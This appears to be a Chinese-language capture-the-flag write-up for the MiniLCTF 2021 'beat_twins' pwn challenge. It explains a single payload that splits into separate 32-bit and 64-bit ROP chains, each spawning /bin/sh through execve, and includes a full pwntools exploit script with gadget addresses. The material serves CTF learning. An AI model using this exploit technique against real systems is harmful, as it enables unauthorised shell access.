# MiniLCTF 2021 - beat_twins

## 题目简述

前端 `server` 同时启动两个后端：32 位静态链接的 `pwn1` 与 64 位静态链接的 `pwn2`，并把同一份用户输入转发给二者。两个后端都存在栈溢出、开启 NX、无 PIE，且各自拥有足够的静态 ROP gadget。要求构造一份在两种位宽下都能正确改变栈指针并执行 `execve` 的混合载荷。

## 解题过程

两个程序的返回地址偏移与调用约定不同。载荷前半段同时放入：

- 32 位的 `add esp, 0x2c; ret`；
- 64 位解释下能够跨过 32 位链前导区的 `add rsp, 0x98; ret`。

借助精确填充，让 32 位进程落到自己的 i386 ROP 链，而 64 位进程跳过该链，落到 amd64 ROP 链。静态二进制不依赖 libc 基址，地址均来自随题附件：

```python
from pwn import context, p32, p64, remote

context.log_level = "info"
p = remote("127.0.0.1", 9999)

# amd64 pwn2
pop_rax = 0x451A57
pop_rdi = 0x40185A
pop_rdx = 0x40175F
pop_rsi = 0x40F3FE
binsh64 = 0x4C5220
syscall_ret = 0x487C99
add_rsp_98 = 0x4029C2

# i386 pwn1
gets32 = 0x8058474
pop_eax = 0x080B05CA
pop_edx_ebx = 0x0805EDE9
pop_ecx = 0x080642B1
binsh32 = 0x080E83C0
int80 = 0x0804A402
add_esp_2c = 0x0804B08E

payload = b"A" * 0x44 + b"B" * 4
payload += p32(add_esp_2c)
payload += b"C" * 12
payload += p64(add_rsp_98)
payload += b"D" * 24

# 32 位链：gets("/bin/sh") 后 execve。
payload += p32(gets32) + p32(pop_eax) + p32(binsh32)
payload += p32(pop_ecx) + p32(0)
payload += p32(pop_edx_ebx) + p32(0) + p32(binsh32)
payload += p32(pop_eax) + p32(11) + p32(int80)

# 64 位 add rsp 会越过前面的区域，落到这里。
payload += b"D" * 0x54
payload += p64(pop_rax) + p64(0)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(binsh64)
payload += p64(pop_rdx) + p64(0x100)
payload += p64(syscall_ret)
payload += p64(pop_rax) + p64(59)
payload += p64(pop_rdi) + p64(binsh64)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall_ret)

p.sendlineafter(b"say ?\n", payload)
p.sendline(b"/bin/sh\x00")
p.interactive()
```

前一个 `read`/`gets` 阶段把 `/bin/sh\0` 写入各自的静态可写地址，后一个阶段再执行系统调用。远程 flag 没有写死在附件中。

## 方法总结

所谓“跨平台”不是让同一串机器码在两种架构上完全同义，而是利用不同位宽的取指、返回地址宽度和栈调整 gadget，把同一字节流分流到两条独立 ROP 链。设计时应先画出字节级栈布局，再逐项核对两个程序各自看到的返回地址；任何填充长度变化都会同时破坏另一条链。
